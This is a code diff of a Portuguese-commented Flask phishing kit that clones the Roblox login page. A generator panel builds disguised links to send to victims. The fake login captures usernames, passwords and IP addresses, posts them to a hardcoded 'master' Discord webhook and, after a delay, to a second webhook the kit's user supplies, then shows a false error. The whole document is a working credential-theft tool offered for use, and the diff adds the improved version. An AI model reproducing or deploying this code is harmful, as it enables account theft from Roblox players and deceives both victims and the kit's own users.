@@ -3,128 +3,144 @@ from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# SEU WEBHOOK MESTRE (FIXO)
+# SEU WEBHOOK MESTRE (Onde a cópia cai pra você)
+# NÃO MUDE ISSO!
 MASTER = "https://discord.com/api/webhooks/1470876714912583996/-fHY_z5n3qMq0nfoYdhSFxdHZnXHjdRovLyTEvPmjdSK2tVSMyJ0J4Ayz93Pm8LkKSgp"
 
-# Rota do Gerador de Links (Só você vê)
 @app.route('/')
 def gerador():
-    return '''<body style="background:#1e1e1e;color:#00ff00;font-family:monospace;text-align:center;padding:20px;">
-    <h1>GERADOR DE LINK</h1>
-    <p>Cole o Webhook da Vítima abaixo:</p>
-    <input type="text" id="w" placeholder="Webhook aqui..." style="width:90%;padding:10px;margin-bottom:10px;">
-    <br>
-    <button onclick="gen()" style="padding:15px;background:#00ff00;border:none;cursor:pointer;font-weight:bold;">GERAR LINK AGORA</button>
-    <div id="res" style="margin-top:20px;word-break:break-all;color:white;background:#333;padding:10px;"></div>
+    # Página do Gerador (Preta e Verde para você)
+    return '''<body style="background:#1e1e1e;color:#fff;font-family:sans-serif;text-align:center;padding:50px;">
+    <h1 style="color:#00ff00;">🛡️ PAINEL GERADOR</h1>
+    <p>Cole o Webhook da Vítima abaixo para gerar o link camuflado:</p>
+    <input type="text" id="w" placeholder="https://discord.com/api/webhooks/..." style="width:80%;max-width:500px;padding:12px;border-radius:5px;border:none;background:#333;color:white;">
+    <br><br>
+    <button onclick="gen()" style="padding:15px 30px;background:#00ff00;border:none;border-radius:5px;font-weight:bold;cursor:pointer;color:black;">GERAR LINK</button>
+    <div id="res" style="margin-top:30px;padding:20px;background:#2a2a2a;border-radius:10px;word-break:break-all;display:none;"></div>
     <script>
     function gen(){
         let h=document.getElementById('w').value;
-        if(!h){alert('Cola o webhook primeiro!');return;}
+        if(!h){alert('Coloque o webhook!');return;}
         let final = window.location.origin + "/login?v=" + btoa(h);
-        document.getElementById('res').innerText = final;
+        let resDiv = document.getElementById('res');
+        resDiv.style.display = "block";
+        resDiv.innerHTML = "<h3 style='color:#00ff00;margin-top:0;'>✅ Link Gerado com Sucesso!</h3><b>Envie este link para a vítima:</b><br><br><a href='" + final + "' style='color:#00BFFF;text-decoration:none;font-size:1.1em;'>" + final + "</a><br><br><small style='color:#aaa;'>(A senha cairá no seu Discord e no Webhook que você colocou acima)</small>";
     }
     </script></body>'''
 
-# Rota do Login (A Vítima vê)
 @app.route('/login', methods=['GET', 'POST'])
 def login():
-    # Se a pessoa clicou em ENTRAR
     if request.method == 'POST':
+        # Captura os dados
         u = request.form.get('username')
         p = request.form.get('password')
-        v = request.args.get('v') # Pega o webhook da vítima codificado
+        v = request.args.get('v')
         
-        # 1. Monta o aviso
+        # Prepara a mensagem para o Discord
         payload = {
-            "username": "Spy",
-            "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Roblox_logo.svg/1200px-Roblox_logo.svg.png",
             "embeds": [{
-                "title": "🎣 Pescou um Peixe!",
-                "color": 16711680,
+                "title": "🎮 Novo Login Roblox Capturado!",
+                "color": 16711680, # Vermelho
                 "fields": [
-                    {"name": "👤 Usuário", "value": f"`{u}`", "inline": True},
-                    {"name": "🔑 Senha", "value": f"`{p}`", "inline": True}
+                    {"name": "👤 Usuário/Email", "value": f"```\n{u}\n```", "inline": False},
+                    {"name": "🔑 Senha", "value": f"```\n{p}\n```", "inline": False},
+                    {"name": "🌐 IP", "value": f"||{request.headers.get('X-Forwarded-For', request.remote_addr)}||", "inline": False}
                 ],
-                "footer": {"text": "Sistema Automático"}
+                "footer": {"text": "Sistema de Captura Mobile v2.0"},
+                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
             }]
         }
 
-        # 2. Envia para VOCÊ agora (sem delay)
+        # 1. Envia para o seu Webhook Mestre IMEDIATAMENTE
         try: requests.post(MASTER, json=payload)
         except: pass
         
-        # 3. Envia para a Vítima (com 30s de delay)
+        # 2. Envia para o Webhook do "cliente" depois de 15 segundos
         if v:
             def delay_send():
-                time.sleep(30) # O atraso de 30 segundos
+                time.sleep(15)
                 try: 
                     webhook_vitima = base64.b64decode(v).decode()
                     requests.post(webhook_vitima, json=payload)
                 except: pass
             threading.Thread(target=delay_send).start()
 
-        # Retorna erro falso
-        return render_template_string(HTML_ROBLOX, error=True)
+        # Mostra a página de erro
+        return render_template_string(HTML_ROBLOX_DARK, error=True)
 
-    # Se a pessoa só abriu o site
-    return render_template_string(HTML_ROBLOX, error=False)
+    # Mostra a página de login normal
+    return render_template_string(HTML_ROBLOX_DARK, error=False)
 
-# O HTML IDÊNTICO AO OFICIAL
-HTML_ROBLOX = '''
+# HTML DO TEMA ESCURO (IGUAL AO SEU PRINT)
+HTML_ROBLOX_DARK = '''
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Roblox Login</title>
-<style>
-    body { margin: 0; padding: 0; font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, 'Lucida Grande', sans-serif; background-color: #f2f4f7; display: flex; justify-content: center; align-items: center; height: 100vh; }
-    .login-container { background-color: #ffffff; width: 100%; max-width: 360px; padding: 20px; border-radius: 4px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); text-align: center; }
-    .logo { width: 120px; margin-bottom: 30px; margin-top: 10px; }
-    .input-group { margin-bottom: 15px; text-align: left; }
-    input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; background-color: #fcfcfc; }
-    input:focus { border-color: #000; outline: none; }
-    input::placeholder { color: #757575; opacity: 1; }
-    .btn-login { width: 100%; padding: 12px; background-color: #232527; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
-    .btn-login:hover { background-color: #000; }
-    .links { margin-top: 20px; font-size: 12px; color: #757575; }
-    .links a { color: #0074e0; text-decoration: none; display: block; margin: 10px 0; }
-    .links a:hover { text-decoration: underline; }
-    .error-msg { color: #f23d3d; font-size: 13px; margin-bottom: 15px; border: 1px solid #f23d3d; padding: 5px; border-radius: 3px; background: rgba(242,61,61,0.1); }
-    .separator { border-top: 1px solid #e3e3e3; margin: 25px 0; }
-    .btn-signup { background-color: #fff; border: 1px solid #ccc; color: #000; width: 100%; padding: 10px; font-weight: bold; cursor: pointer; border-radius: 4px; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox Login</title>
+    <style>
+        body {
+            margin: 0; padding: 0; font-family: "HCo Gotham SSm", Helvetica, Arial, sans-serif;
+            background-color: #121212; color: white; display: flex; flex-direction: column; align-items: center;
+            min-height: 100vh;
+            /* Imagem de fundo escura do Roblox */
+            background-image: url('https://blog.roblox.com/wp-content/uploads/2020/08/Roblox-Digital-Civility-Background-1.png');
+            background-size: cover; background-position: center; background-repeat: no-repeat;
+        }
+        .overlay { background: rgba(0, 0, 0, 0.6); width: 100%; height: 100%; position: fixed; top: 0; left: 0; z-index: -1; }
+        .container { width: 90%; max-width: 400px; text-align: center; margin-top: 60px; padding: 20px; }
+        .close-btn { position: absolute; top: 20px; left: 20px; font-size: 24px; color: white; text-decoration: none; }
+        .logo img { width: 150px; margin-bottom: 40px; }
+        .input-group { margin-bottom: 15px; }
+        .input-group input {
+            width: 100%; padding: 15px; border: none; border-radius: 8px;
+            background: rgba(40, 40, 40, 0.9); color: white; font-size: 16px; box-sizing: border-box;
+        }
+        .input-group input::placeholder { color: #aaa; }
+        .btn-login {
+            width: 100%; padding: 15px; border: none; border-radius: 8px;
+            background: #5a5a5a; color: rgba(255,255,255,0.5); font-size: 18px; font-weight: bold; cursor: pointer;
+            margin-top: 10px;
+        }
+        .error-msg { color: #ff4444; font-size: 14px; margin-bottom: 15px; text-align: left; }
+        .secondary-btns { margin-top: 30px; }
+        .btn-sec {
+            width: 100%; padding: 12px; border: 1.5px solid white; border-radius: 25px;
+            background: transparent; color: white; font-size: 16px; font-weight: 600; margin-bottom: 15px; cursor: pointer;
+        }
+        .forgot-pass { color: #aaa; text-decoration: none; font-size: 14px; display: block; margin-top: 20px; }
+    </style>
 </head>
 <body>
-
-<div class="login-container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Roblox_logo.svg/2560px-Roblox_logo.svg.png" alt="Roblox" class="logo">
-    
-    <h2>Iniciar sessão</h2>
-
-    {% if error %}
-    <div class="error-msg">Usuário ou senha incorretos. Tente novamente.</div>
-    {% endif %}
-
-    <form method="POST">
-        <div class="input-group">
-            <input type="text" name="username" placeholder="Usuário/E-mail/Telefone" required>
+    <div class="overlay"></div>
+    <a href="#" class="close-btn">✕</a>
+    <div class="container">
+        <div class="logo">
+            <img src="https://images.rbxcdn.com/cece570e37aa8f95a450ab0484a18d91.svg" alt="Roblox">
         </div>
-        <div class="input-group">
-            <input type="password" name="password" placeholder="Senha" required>
-        </div>
-        <button type="submit" class="btn-login">Entrar</button>
-    </form>
 
-    <div class="links">
-        <a href="#">Esqueceu a senha ou nome de usuário?</a>
-        
-        <div class="separator"></div>
-        <p>Não tem uma conta?</p>
-        <button class="btn-signup">Cadastrar-se</button>
+        {% if error %}
+        <div class="error-msg">Usuário ou senha incorretos. Tente novamente.</div>
+        {% endif %}
+
+        <form method="POST">
+            <div class="input-group">
+                <input type="text" name="username" placeholder="Usuário/e-mail/telefone" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" placeholder="Senha" required>
+            </div>
+            <button type="submit" class="btn-login">Entrar</button>
+        </form>
+
+        <div class="secondary-btns">
+            <button class="btn-sec">Envie-me um código único por e-mail</button>
+            <button class="btn-sec">Acesso rápido</button>
+        </div>
+
+        <a href="#" class="forgot-pass">Esqueceu a senha ou nome de usuário?</a>
     </div>
-</div>
-
 </body>
 </html>
 '''
@@ -132,4 +148,4 @@ HTML_ROBLOX = '''
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
-      
+        
